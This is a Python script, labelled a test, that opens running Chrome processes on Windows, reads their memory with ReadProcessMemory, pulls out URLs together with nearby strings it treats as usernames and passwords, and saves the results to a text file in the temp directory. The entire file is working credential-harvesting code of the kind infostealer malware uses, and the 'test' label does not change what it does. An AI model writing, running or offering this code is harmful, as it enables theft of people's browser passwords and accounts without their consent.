"""
Test script for Chrome memory dump functionality
Run this while Chrome is open to test memory extraction
"""
import ctypes
from ctypes import wintypes
import psutil
import re
import os
import tempfile

def dump_chrome_memory():
    """Extract passwords from Chrome's running process memory"""
    try:
        # Find Chrome processes
        chrome_pids = []
        for proc in psutil.process_iter(['pid', 'name']):
            if 'chrome.exe' in proc.info['name'].lower():
                chrome_pids.append(proc.info['pid'])
        
        if not chrome_pids:
            print("❌ Chrome is not running")
            return
        
        print(f"✅ Found {len(chrome_pids)} Chrome processes")
        
        # Windows API constants
        PROCESS_VM_READ = 0x0010
        PROCESS_QUERY_INFORMATION = 0x0400
        
        # Load kernel32
        kernel32 = ctypes.windll.kernel32
        
        found_creds = []
        
        for pid in chrome_pids[:5]:  # Test first 5 processes only
            try:
                print(f"📊 Scanning PID {pid}...")
                # Open process
                h_process = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
                if not h_process:
                    print(f"  ⚠️ Could not open process {pid}")
                    continue
                
                # Get process memory info
                mbi = ctypes.create_string_buffer(48)  # MEMORY_BASIC_INFORMATION size
                address = 0
                regions_scanned = 0
                
                while address < 0x7FFFFFFF and regions_scanned < 100:  # Limit to 100 regions for testing
                    if kernel32.VirtualQueryEx(h_process, address, ctypes.byref(mbi), len(mbi)) == 0:
                        break
                    
                    # Extract region info safely
                    try:
                        base_address = ctypes.c_void_p.from_buffer(mbi, 0).value
                        region_size = ctypes.c_size_t.from_buffer(mbi, 16).value
                        state = ctypes.c_ulong.from_buffer(mbi, 24).value
                        protect = ctypes.c_ulong.from_buffer(mbi, 28).value
                        
                        # Handle None values
                        if base_address is None or region_size is None:
                            address += 0x10000  # Skip 64KB
                            continue
                    except:
                        address += 0x10000
                        continue
                    
                    # Only scan committed, readable memory
                    MEM_COMMIT = 0x1000
                    PAGE_READABLE = 0x02 | 0x04 | 0x08 | 0x10 | 0x20 | 0x40
                    
                    if state == MEM_COMMIT and (protect & PAGE_READABLE) and region_size < 10*1024*1024:  # Skip huge regions
                        # Read memory region
                        buffer = ctypes.create_string_buffer(region_size)
                        bytes_read = ctypes.c_size_t()
                        
                        if kernel32.ReadProcessMemory(h_process, base_address, buffer, region_size, ctypes.byref(bytes_read)):
                            # Search for password patterns
                            data = buffer.raw[:bytes_read.value]
                            
                            # Look for common password field patterns
                            url_pattern = rb'https?://[^\x00]{10,100}\x00'
                            urls = re.findall(url_pattern, data)
                            
                            for url_match in urls:
                                url = url_match.decode('utf-8', errors='ignore').strip('\x00')
                                # Look for potential credentials near this URL
                                url_pos = data.find(url_match)
                                context = data[max(0, url_pos-100):url_pos+300]
                                
                                # Extract printable strings near URL
                                strings = re.findall(rb'[\x20-\x7E]{4,50}', context)
                                if len(strings) >= 2:
                                    potential_user = strings[0].decode('utf-8', errors='ignore')
                                    potential_pass = strings[1].decode('utf-8', errors='ignore') if len(strings) > 1 else ""
                                    
                                    # Basic validation
                                    if '@' in potential_user or len(potential_user) > 3:
                                        cred_str = f"URL: {url}\nUser: {potential_user}\nPass: {potential_pass}"
                                        if cred_str not in found_creds:
                                            found_creds.append(cred_str)
                                            print(f"  🔑 Found credential for {url}")
                        
                        regions_scanned += 1
                    
                    address = base_address + region_size
                
                kernel32.CloseHandle(h_process)
                print(f"  ✅ Scanned {regions_scanned} regions")
            
            except Exception as e:
                print(f"  ❌ Error scanning PID {pid}: {e}")
                continue
        
        if found_creds:
            temp_file = os.path.join(tempfile.gettempdir(), "Chrome_Memory_Dump_Test.txt")
            with open(temp_file, "w", encoding='utf-8') as f:
                f.write("\n\n".join(found_creds))
            print(f"\n✅ Found {len(found_creds)} credentials!")
            print(f"📄 Saved to: {temp_file}")
            print("\n" + "="*50)
            print("SAMPLE OUTPUT:")
            print("="*50)
            print("\n\n".join(found_creds[:3]))  # Show first 3
        else:
            print("\n⚠️ No credentials found in Chrome memory")
            print("   This could mean:")
            print("   - No active login sessions")
            print("   - Credentials not in scanned memory regions")
            print("   - Need to scan more processes/regions")
            
    except Exception as e:
        print(f"❌ Memory dump error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    print("="*50)
    print("Chrome Memory Dump Test")
    print("="*50)
    print("\n⚠️ Make sure Chrome is running with active sessions\n")
    dump_chrome_memory()
